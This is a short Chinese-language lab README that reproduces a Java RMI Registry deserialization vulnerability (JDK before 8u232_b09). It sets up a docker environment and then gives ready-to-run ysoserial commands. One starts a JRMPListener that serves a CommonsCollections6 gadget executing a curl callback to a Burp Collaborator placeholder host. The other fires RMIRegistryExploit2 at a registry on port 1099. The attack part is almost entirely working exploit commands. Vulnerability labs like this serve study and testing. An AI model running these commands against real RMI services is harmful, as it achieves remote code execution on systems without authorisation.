# Java RMI Registry 反序列化漏洞(<jdk8u232_b09)

## 漏洞环境

执行如下命令编译及启动RMI Registry和服务器：

```plain
docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
```

其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。

环境启动后，RMI Registry监听在1099端口。

## 漏洞复现

通过[ysoserial](https://github.com/wh1t3p1g/ysoserial#tdsub)的exploit包中的RMIRegistryExploit2或者3进行攻击

```plain
// 开启JRMPListener
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
// 发起攻击
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780885720236-8a7eefa2-891f-40a8-93ec-3c12a4031d83.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780885720582-19ed93a3-6bb1-40b4-b77e-3ba364bbc8d7.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780885720845-40ff01fd-c0a4-4a50-b3f4-7cb90b32fb44.png)

Registry会返回报错，这个没关系正常，命令会正常执行.